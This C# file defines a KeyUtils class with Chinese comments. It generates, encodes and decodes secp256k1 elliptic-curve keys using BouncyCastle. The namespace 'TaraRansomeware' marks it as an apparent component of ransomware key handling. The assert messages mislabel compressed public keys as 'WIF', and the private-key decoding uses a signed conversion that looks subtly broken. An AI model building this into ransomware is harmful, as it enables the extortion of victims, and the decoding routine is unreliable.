using Org.BouncyCastle.Asn1.X9;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Math.EC;
using Org.BouncyCastle.Security;
using System.Diagnostics;

namespace TaraRansomeware
{
    internal class KeyUtils
    {
        /// <summary>
        /// 加密使用的椭圆曲线名称及其参数
        /// </summary>
        public static readonly string CurveName = "secp256k1";
        public static readonly X9ECParameters CurveParameters = ECNamedCurveTable.GetByName(CurveName);
        public static readonly ECDomainParameters DomainParameters = new ECDomainParameters(
            CurveParameters.Curve, CurveParameters.G, CurveParameters.N
        );

        /// <summary>
        /// 生成一个随机密钥
        /// </summary>
        /// <returns>一个新的椭圆曲线密钥对</returns>
        public static AsymmetricCipherKeyPair GenerateKeyPair()
        {
            ECKeyPairGenerator keygen = new ECKeyPairGenerator();
            keygen.Init(new ECKeyGenerationParameters(DomainParameters, new SecureRandom()));
            return keygen.GenerateKeyPair();
        }

        /// <summary>
        /// 生成椭圆曲线公钥的Hex_compressed格式编码
        /// </summary>
        /// <param name="pubKey">椭圆曲线公钥</param>
        /// <returns>公钥的编码字节串</returns>
        public static byte[] EncodeECPublicKey(ECPublicKeyParameters pubKey)
        {
            return pubKey.Q.GetEncoded(true);
        }

        /// <summary>
        /// 从Hex_compressed格式编码中解析出椭圆曲线公钥
        /// </summary>
        /// <param name="encPubKey">椭圆曲线公钥的Hex_compressed格式编码</param>
        /// <returns>椭圆曲线公钥</returns>
        public static ECPublicKeyParameters DecodeECPublicKey(byte[] encPubKey)
        {
            Debug.Assert(
                encPubKey.Length == 33,
                "Encoded EC public key must be in compressed-WIF form"
            );

            Debug.Assert(
                encPubKey[0] == 0x02 || encPubKey[0] == 0x03,
                "Encoded EC public key must be in compressed-WIF form"
            );

            X9ECParameters ps = CurveParameters;
            ECPoint point = ps.Curve.DecodePoint(encPubKey);
            return new ECPublicKeyParameters(point, DomainParameters);
        }

        /// <summary>
        /// 从字节码中解析出椭圆曲线私钥
        /// </summary>
        /// <param name="encPrivKey">私钥的字节编码</param>
        /// <returns>椭圆曲线私钥</returns>
        public static ECPrivateKeyParameters DecodeECPrivateKey(byte[] encPrivKey)
        {
            Debug.Assert(
                encPrivKey.Length == 32,
                "Encoded EC private key must be in hex form"
            );

            return new ECPrivateKeyParameters(new BigInteger(encPrivKey), DomainParameters);
        }
    }
}